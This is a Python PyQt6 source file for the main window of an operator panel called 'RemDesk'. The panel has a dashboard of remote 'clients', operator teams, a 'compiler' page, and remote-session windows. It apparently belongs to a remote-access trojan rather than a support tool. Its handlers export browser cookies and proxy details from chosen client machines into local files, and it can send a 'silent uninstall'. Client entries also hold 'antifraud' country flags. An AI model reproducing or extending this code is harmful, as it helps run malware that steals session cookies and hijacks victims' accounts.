from typing import Dict, List
from urllib.parse import urlsplit, urlunsplit

from PyQt6 import QtCore, QtGui, QtWidgets

from ..core.api import DEFAULT_API_TOKEN, DEFAULT_API_URL, RemoteControllerApi
from ..core.i18n import I18n
from ..core.logging import EventLogger
from ..core.settings import SettingsStore
from .common import ICON_DIR, animate_widget, make_button
from .remote_session import RemoteSessionDialog, build_session_url, webengine_available
from .pages.compiler import CompilerPage
from .pages.dashboard import DashboardPage
from .pages.instructions import InstructionsPage
from .pages.settings import SettingsPage
from .pages.teams import TeamsPage


class MainShell(QtWidgets.QWidget):
    page_changed = QtCore.pyqtSignal(str)
    logout_requested = QtCore.pyqtSignal()

    def __init__(
        self,
        i18n: I18n,
        settings: SettingsStore,
        logger: EventLogger,
        api: RemoteControllerApi | None = None,
    ):
        super().__init__()
        self.i18n = i18n
        self.settings = settings
        self.logger = logger
        self.api = api
        self.current_role = self.settings.get("role", "operator")
        self._ping_ms = None
        self._server_online = None
        self._session_windows: Dict[str, RemoteSessionDialog] = {}
        self._storage_windows: Dict[str, RemoteSessionDialog] = {}
        self._utility_sessions: Dict[str, RemoteSessionDialog] = {}
        layout = QtWidgets.QHBoxLayout(self)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(16)

        self.sidebar = QtWidgets.QFrame()
        self.sidebar.setObjectName("Sidebar")
        self.sidebar.setFixedWidth(220)
        sidebar_layout = QtWidgets.QVBoxLayout(self.sidebar)
        sidebar_layout.setContentsMargins(20, 20, 20, 20)
        sidebar_layout.setSpacing(16)

        brand = QtWidgets.QFrame()
        brand_layout = QtWidgets.QVBoxLayout(brand)
        self.brand_icon = QtWidgets.QLabel("RC")
        self.brand_icon.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.brand_icon.setFixedSize(72, 72)
        self.brand_icon.setObjectName("BrandIcon")
        self.brand_title = QtWidgets.QLabel()
        self.brand_title.setStyleSheet("font-weight: 700; font-size: 16px;")
        self.brand_subtitle = QtWidgets.QLabel()
        self.brand_subtitle.setObjectName("Muted")
        brand_layout.addWidget(self.brand_icon, alignment=QtCore.Qt.AlignmentFlag.AlignLeft)
        brand_layout.addWidget(self.brand_title)
        brand_layout.addWidget(self.brand_subtitle)
        sidebar_layout.addWidget(brand)
        self._apply_brand_icon()

        self.nav_buttons = {}
        self.nav_group = QtWidgets.QButtonGroup(self)
        self.nav_group.setExclusive(True)
        for key in ["main", "teams", "compiler", "settings", "instructions"]:
            button = make_button("", "ghost")
            button.setCheckable(True)
            button.setMinimumHeight(40)
            self.nav_group.addButton(button)
            self.nav_buttons[key] = button
            sidebar_layout.addWidget(button)
            button.clicked.connect(lambda _, page_key=key: self.switch_page(page_key))

        sidebar_layout.addStretch()
        self.status_label = QtWidgets.QLabel()
        self.status_label.setObjectName("StatusBadge")
        self.status_label.setProperty("status", "unknown")
        sidebar_layout.addWidget(self.status_label)
        self.sidebar_footer = QtWidgets.QLabel(self.i18n.t("ping_unavailable"))
        self.sidebar_footer.setObjectName("Muted")
        sidebar_layout.addWidget(self.sidebar_footer)

        layout.addWidget(self.sidebar)

        content = QtWidgets.QVBoxLayout()
        self.top_bar = QtWidgets.QFrame()
        self.top_bar.setObjectName("TopBar")
        top_layout = QtWidgets.QHBoxLayout(self.top_bar)
        self.page_title = QtWidgets.QLabel()
        self.page_title.setStyleSheet("font-weight: 600; font-size: 16px;")
        top_layout.addWidget(self.page_title)
        top_layout.addStretch()
        self.operator_label = QtWidgets.QLabel()
        self.operator_label.setObjectName("OperatorBadge")
        top_layout.addWidget(self.operator_label)
        self.refresh_button = make_button("", "ghost")
        self.refresh_button.clicked.connect(lambda: self.page_changed.emit("refresh"))
        top_layout.addWidget(self.refresh_button)
        self.logout_button = make_button("", "ghost")
        self.logout_button.clicked.connect(self.logout_requested.emit)
        top_layout.addWidget(self.logout_button)
        content.addWidget(self.top_bar)

        self.connection_banner = QtWidgets.QFrame()
        self.connection_banner.setObjectName("ConnectionBanner")
        banner_layout = QtWidgets.QHBoxLayout(self.connection_banner)
        banner_layout.setContentsMargins(12, 8, 12, 8)
        banner_layout.setSpacing(10)
        self.banner_icon = QtWidgets.QLabel("!")
        self.banner_icon.setObjectName("ConnectionBannerIcon")
        self.banner_text = QtWidgets.QLabel()
        self.banner_text.setObjectName("ConnectionBannerText")
        self.banner_text.setWordWrap(True)
        self.banner_retry = make_button("", "primary")
        self.banner_retry.clicked.connect(self.trigger_reconnect)
        banner_layout.addWidget(self.banner_icon)
        banner_layout.addWidget(self.banner_text, 1)
        banner_layout.addWidget(self.banner_retry)
        self.connection_banner.setVisible(False)
        content.addWidget(self.connection_banner)

        self.stack = QtWidgets.QStackedWidget()
        self.dashboard = DashboardPage(i18n, settings, logger, api=api)
        self.teams_page = TeamsPage(i18n, settings, api=api)
        self.compiler = CompilerPage(i18n, settings, logger)
        self.settings_page = SettingsPage(i18n, settings, api=api)
        self.instructions_page = InstructionsPage(i18n)
        self.stack.addWidget(self.dashboard)
        self.stack.addWidget(self.teams_page)
        self.stack.addWidget(self.compiler)
        self.stack.addWidget(self.settings_page)
        self.stack.addWidget(self.instructions_page)
        content.addWidget(self.stack, 1)

        layout.addLayout(content, 1)

        self.dashboard.storage_requested.connect(self.open_storage)
        self.dashboard.connect_requested.connect(self.toggle_connection)
        self.dashboard.extra_action_requested.connect(self.handle_extra_action)
        self.dashboard.delete_requested.connect(self.handle_delete_request)
        self.dashboard.ping_updated.connect(self.update_ping)
        self.dashboard.server_status_changed.connect(self.handle_server_status)
        self.settings_page.logout_requested.connect(self.logout_requested.emit)
        self.settings_page.theme_changed.connect(self.emit_theme_change)
        self.settings_page.language_changed.connect(self.emit_language_change)
        self.settings_page.role_changed.connect(self.handle_role_change)
        self.settings_page.profile_updated.connect(self.update_operator_label)
        self.teams_page.teams_updated.connect(self.update_operator_label)

        self.apply_translations()
        self.update_role_visibility()
        self.nav_buttons["main"].setChecked(True)
        self.switch_page("main")

    def apply_translations(self) -> None:
        self.nav_buttons["main"].setText(self.i18n.t("nav_main"))
        self.nav_buttons["teams"].setText(self.i18n.t("nav_teams"))
        self.nav_buttons["compiler"].setText(self.i18n.t("nav_compiler"))
        self.nav_buttons["settings"].setText(self.i18n.t("nav_settings"))
        self.nav_buttons["instructions"].setText(self.i18n.t("nav_instructions"))
        self.refresh_button.setText(self.i18n.t("top_refresh"))
        self.logout_button.setText(self.i18n.t("top_logout"))
        self.banner_text.setText(self.i18n.t("server_connection_lost"))
        self.banner_retry.setText(self.i18n.t("server_connection_retry"))
        self._render_status_label()
        self.update_brand_header()
        self.update_operator_label()
        self.dashboard.apply_translations()
        self.teams_page.apply_translations()
        self.compiler.apply_translations()
        self.settings_page.apply_translations()
        self.instructions_page.apply_translations()
        self._render_ping_label()
        self.update_page_title()

    def _apply_brand_icon(self) -> None:
        icon_path = ICON_DIR / "logo.svg"
        if not icon_path.exists():
            return
        pixmap = QtGui.QPixmap(str(icon_path))
        if pixmap.isNull():
            return
        size = int(self.brand_icon.width() * 0.9) or 32
        pixmap = pixmap.scaled(
            size,
            size,
            QtCore.Qt.AspectRatioMode.KeepAspectRatio,
            QtCore.Qt.TransformationMode.SmoothTransformation,
        )
        self.brand_icon.setPixmap(pixmap)
        self.brand_icon.setText("")

    def update_brand_header(self) -> None:
        self.brand_title.setText("RemDesk")
        self.brand_subtitle.setText(self._current_page_label())

    def update_page_title(self) -> None:
        self.page_title.setText(self._resolve_team_label())

    def _current_page_label(self) -> str:
        index = self.stack.currentIndex()
        titles = [
            self.i18n.t("nav_main"),
            self.i18n.t("nav_teams"),
            self.i18n.t("nav_compiler"),
            self.i18n.t("nav_settings"),
            self.i18n.t("nav_instructions"),
        ]
        if 0 <= index < len(titles):
            return titles[index]
        return ""

    def _resolve_team_label(self) -> str:
        team_id = self.settings.get("operator_team_id", "")
        if not team_id:
            return self.i18n.t("unassigned_label")
        for team in self.settings.get("teams", []):
            if team.get("id") == team_id:
                return team.get("name") or team_id
        return team_id

    def switch_page(self, key: str) -> None:
        if key in self.nav_buttons:
            self.nav_buttons[key].setChecked(True)
        mapping = {
            "main": 0,
            "teams": 1,
            "compiler": 2,
            "settings": 3,
            "instructions": 4,
        }
        index = mapping.get(key, 0)
        self.stack.setCurrentIndex(index)
        self.update_brand_header()
        self.update_page_title()
        if key == "teams":
            self.teams_page.refresh_from_api()
        animate_widget(self.stack.currentWidget())

    def update_role_visibility(self) -> None:
        self.nav_buttons["teams"].setVisible(True)

    def open_storage(self, client_id: str) -> None:
        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
        client_name = client["name"] if client else client_id
        self.logger.log("log_storage_open", client=client_name)
        session = self._session_windows.get(client_id)
        if session:
            session.open_storage_drawer()
            session.raise_()
            session.activateWindow()
            return
        storage_window = self._storage_windows.get(client_id)
        if storage_window:
            storage_window.open_storage_drawer()
            storage_window.raise_()
            storage_window.activateWindow()
            return
        self._open_storage_session(client_id)

    def toggle_connection(self, client_id: str, currently_connected: bool) -> None:
        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
        if not client:
            return
        if currently_connected:
            self._close_session(client_id)
            client["connected"] = False
            self.logger.log("log_disconnect", client=client["name"])
        else:
            self.logger.log("log_connect", client=client["name"])
            if self._open_session(client_id):
                client["connected"] = True
                self.logger.log("log_connected", client=client["name"])
        self.dashboard.refresh_view()
        self.settings.set("clients", self.dashboard.clients)
        self.settings.save()

    def handle_delete_request(self, client_id: str) -> None:
        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
        client_name = client["name"] if client else client_id
        self.logger.log("log_delete_requested", client=client_name)
        self.send_silent_uninstall(client_id, client_name)

    def handle_extra_action(self, client_id: str, action: str) -> None:
        if not action:
            return
        if action.startswith("cookies:"):
            browser = action.split(":", 1)[1] or "all"
            browsers = [] if browser == "all" else [browser]
            self.request_cookie_export(client_id, browsers)
            return
        if action == "proxy":
            self.request_proxy_export(client_id)
            return

    def request_cookie_export(self, client_id: str, browsers: list[str]) -> None:
        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
        client_name = client["name"] if client else client_id
        label = ", ".join(browsers) if browsers else self.i18n.t("menu_cookies_all")
        folder = QtWidgets.QFileDialog.getExistingDirectory(
            self, self.i18n.t("storage_pick_folder"), ""
        )
        if not folder:
            return
        filename = self._build_cookie_filename(browsers)
        window = self._session_windows.get(client_id) or self._storage_windows.get(client_id)
        if window is None:
            window = self._open_utility_session(client_id)
            if window is None:
                return
            self._schedule_utility_close(client_id)
        window.request_cookie_export(browsers, filename=filename, download_dir=folder)
        self.logger.log("log_cookies_request", client=client_name, browsers=label, path=folder)

    def request_proxy_export(self, client_id: str) -> None:
        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
        client_name = client["name"] if client else client_id
        folder = QtWidgets.QFileDialog.getExistingDirectory(
            self, self.i18n.t("storage_pick_folder"), ""
        )
        if not folder:
            return
        safe_id = self._sanitize_filename_token(client_id)
        filename = f"proxy_{safe_id}.txt"
        window = self._session_windows.get(client_id) or self._storage_windows.get(client_id)
        if window is None:
            window = self._open_utility_session(client_id)
            if window is None:
                return
            self._schedule_utility_close(client_id)
        window.request_proxy_export(client_id, filename=filename, download_dir=folder)
        self.logger.log("log_proxy_request", client=client_name, path=folder)

    @staticmethod
    def _sanitize_filename_token(value: str) -> str:
        cleaned = "".join(ch if ch.isalnum() or ch in {"-", "_"} else "_" for ch in value)
        return cleaned or "client"

    @staticmethod
    def _build_cookie_filename(browsers: list[str]) -> str:
        stamp = QtCore.QDateTime.currentDateTime().toString("yyyyMMdd_HHmmss")
        label = "all" if not browsers else "_".join(browsers)
        return f"cookies_{label}_{stamp}.json"

    def send_silent_uninstall(self, client_id: str, client_name: str) -> None:
        # TODO: integrate with remote control backend to trigger uninstall.
        self.logger.log("log_delete_signal", client=client_name)

    def emit_theme_change(self, theme: str) -> None:
        self.page_changed.emit(f"theme:{theme}")

    def emit_language_change(self, lang: str) -> None:
        self.page_changed.emit(f"lang:{lang}")

    def handle_role_change(self, role: str) -> None:
        self.current_role = role
        self.teams_page.set_role(role)
        self.dashboard.set_role(role)
        self.update_role_visibility()

    def update_ping(self, ping_ms: object) -> None:
        self._ping_ms = ping_ms if isinstance(ping_ms, int) else None
        self._render_ping_label()

    def update_operator_label(self) -> None:
        account_id = self.settings.get("account_id", "")
        display_name = self.settings.get("operator_name", "").strip()
        if not display_name and account_id:
            display_name = self.teams_page.resolve_operator_name(account_id) or ""
        if display_name:
            label = display_name
        elif account_id:
            label = account_id
        else:
            label = self.i18n.t("operator_unknown")
        role = self.settings.get("role", "operator")
        role_key = f"settings_role_{role}"
        role_label = self.i18n.t(role_key)
        if role_label == role_key:
            role_label = role
        team_label = self._resolve_team_label()
        self.operator_label.setText(f"{label} | {team_label} | {role_label}")
        self.update_page_title()

    def _resolve_server_url(self) -> str:
        url = str(self.settings.get("api_url", "") or "").strip()
        if not url:
            url = DEFAULT_API_URL
        if "://" not in url:
            url = f"http://{url}"
        parsed = urlsplit(url)
        return urlunsplit((parsed.scheme, parsed.netloc, parsed.path or "", "", ""))

    def _resolve_api_token(self) -> str:
        token = str(self.settings.get("api_token", "") or "").strip()
        if not token:
            token = DEFAULT_API_TOKEN
        return token

    def _open_session(self, client_id: str, open_storage: bool = False) -> bool:
        if not client_id:
            QtWidgets.QMessageBox.warning(
                self,
                "RemDesk",
                "Unable to open session: missing client id.",
            )
            return False
        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
        base_url = self._resolve_server_url()
        token = self._resolve_api_token()
        region = ""
        country = ""
        country_code = ""
        flags: list[str] = []
        if client:
            region = str(client.get("region") or "").strip()
            country = region
            config = client.get("client_config") or {}
            if isinstance(config, dict):
                antifraud = config.get("antifraud") or {}
                if isinstance(antifraud, dict):
                    raw_flags = antifraud.get("countries") or []
                    if isinstance(raw_flags, list):
                        flags = [str(code).upper() for code in raw_flags if str(code).strip()]
            if flags:
                country_code = flags[0]
        if client_id in self._session_windows:
            window = self._session_windows[client_id]
            window.apply_context(
                server_url=base_url,
                token=token,
                session_id=client_id,
                region=region or None,
                country=country or None,
                country_code=country_code or None,
                flags=flags or None,
                auto_connect=True,
                open_storage=open_storage,
                manage_mode=False,
                storage_only=False,
            )
            window.raise_()
            window.activateWindow()
            return True

        session_url = build_session_url(
            base_url,
            client_id,
            token,
            open_storage=open_storage,
            mode="view",
            storage_only=False,
            region=region or None,
            country=country or None,
            country_code=country_code or None,
            flags=flags or None,
        )

        if not webengine_available():
            QtWidgets.QMessageBox.warning(
                self,
                "RemDesk",
                "PyQt6-WebEngine is required to open remote sessions in a window.",
            )
            return False

        dialog = RemoteSessionDialog(
            client_id,
            session_url,
            base_url,
            token,
            open_storage,
            manage_mode=False,
            storage_only=False,
            show_window=True,
            region=region or None,
            country=country or None,
            country_code=country_code or None,
            flags=flags or None,
            parent=self,
        )
        dialog.closed.connect(self._handle_session_closed)
        self._session_windows[client_id] = dialog
        dialog.show()
        return True

    def _open_storage_session(self, client_id: str) -> bool:
        if not client_id:
            QtWidgets.QMessageBox.warning(
                self,
                "RemDesk",
                "Unable to open storage: missing client id.",
            )
            return False
        base_url = self._resolve_server_url()
        token = self._resolve_api_token()
        if client_id in self._storage_windows:
            window = self._storage_windows[client_id]
            window.apply_context(
                server_url=base_url,
                token=token,
                session_id=client_id,
                auto_connect=True,
                open_storage=True,
                manage_mode=False,
                storage_only=True,
            )
            window.raise_()
            window.activateWindow()
            return True

        session_url = build_session_url(
            base_url,
            client_id,
            token,
            open_storage=True,
            mode="view",
            storage_only=True,
        )

        if not webengine_available():
            QtWidgets.QMessageBox.warning(
                self,
                "RemDesk",
                "PyQt6-WebEngine is required to open storage sessions in a window.",
            )
            return False

        dialog = RemoteSessionDialog(
            client_id,
            session_url,
            base_url,
            token,
            True,
            manage_mode=False,
            storage_only=True,
            show_window=True,
            parent=self,
        )
        dialog.closed.connect(self._handle_storage_session_closed)
        self._storage_windows[client_id] = dialog
        dialog.show()
        return True

    def _open_utility_session(self, client_id: str) -> RemoteSessionDialog | None:
        if not client_id:
            QtWidgets.QMessageBox.warning(
                self,
                "RemDesk",
                "Unable to open session: missing client id.",
            )
            return None
        base_url = self._resolve_server_url()
        token = self._resolve_api_token()
        if client_id in self._utility_sessions:
            window = self._utility_sessions[client_id]
            window.apply_context(
                server_url=base_url,
                token=token,
                session_id=client_id,
                auto_connect=True,
                open_storage=False,
                manage_mode=False,
                storage_only=False,
            )
            return window

        session_url = build_session_url(
            base_url,
            client_id,
            token,
            open_storage=False,
            mode="view",
            storage_only=False,
        )

        if not webengine_available():
            QtWidgets.QMessageBox.warning(
                self,
                "RemDesk",
                "PyQt6-WebEngine is required to export client data.",
            )
            return None

        dialog = RemoteSessionDialog(
            client_id,
            session_url,
            base_url,
            token,
            False,
            manage_mode=False,
            storage_only=False,
            show_window=False,
            parent=self,
        )
        dialog.closed.connect(self._handle_utility_session_closed)
        self._utility_sessions[client_id] = dialog
        dialog.show()
        return dialog

    def _schedule_utility_close(self, client_id: str, delay_ms: int = 60000) -> None:
        def _close_if_idle() -> None:
            window = self._utility_sessions.get(client_id)
            if window is None:
                return
            window.close()

        QtCore.QTimer.singleShot(delay_ms, _close_if_idle)

    def _handle_storage_session_closed(self, client_id: str) -> None:
        self._storage_windows.pop(client_id, None)

    def _handle_utility_session_closed(self, client_id: str) -> None:
        self._utility_sessions.pop(client_id, None)

    def _close_session(self, client_id: str) -> None:
        dialog = self._session_windows.pop(client_id, None)
        if dialog:
            dialog.close()

    def _handle_session_closed(self, client_id: str) -> None:
        self._session_windows.pop(client_id, None)
        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
        if not client or not client.get("connected"):
            return
        client["connected"] = False
        self.logger.log("log_disconnect", client=client.get("name", client_id))
        self.dashboard.refresh_view()
        self.settings.set("clients", self.dashboard.clients)
        self.settings.save()

    def _render_ping_label(self) -> None:
        if self._ping_ms is None:
            self.sidebar_footer.setText(self.i18n.t("ping_unavailable"))
        else:
            self.sidebar_footer.setText(f'{self.i18n.t("ping_label")}: {self._ping_ms} ms')

    def handle_server_status(self, online: bool) -> None:
        if self._server_online is online:
            return
        self._server_online = online
        self._render_status_label()
        self.connection_banner.setVisible(not online)

    def _render_status_label(self) -> None:
        if self._server_online is None:
            status_key = "top_status_unknown"
            status_value = "unknown"
        else:
            status_key = "top_status_online" if self._server_online else "top_status_offline"
            status_value = "online" if self._server_online else "offline"
        self.status_label.setText(f'{self.i18n.t("top_status_label")}: {self.i18n.t(status_key)}')
        self.status_label.setProperty("status", status_value)
        self.status_label.style().unpolish(self.status_label)
        self.status_label.style().polish(self.status_label)

    def trigger_reconnect(self) -> None:
        self.dashboard.refresh_clients()
        self.teams_page.refresh_from_api()
